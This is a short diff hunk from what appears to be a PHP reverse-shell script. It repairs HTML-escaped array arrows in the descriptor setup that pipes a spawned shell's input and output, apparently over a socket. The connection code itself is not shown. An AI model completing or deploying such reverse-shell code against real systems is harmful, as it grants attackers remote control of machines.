@@ -66,9 +66,9 @@ if (!$sock) {
  
 // Spawn shell process
 $descriptorspec = array(
-   0 =&gt; array("pipe", "r"),  // stdin is a pipe that the child will read from
-   1 =&gt; array("pipe", "w"),  // stdout is a pipe that the child will write to
-   2 =&gt; array("pipe", "w")   // stderr is a pipe that the child will write to
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
 );
  
 $process = proc_open($shell, $descriptorspec, $pipes);
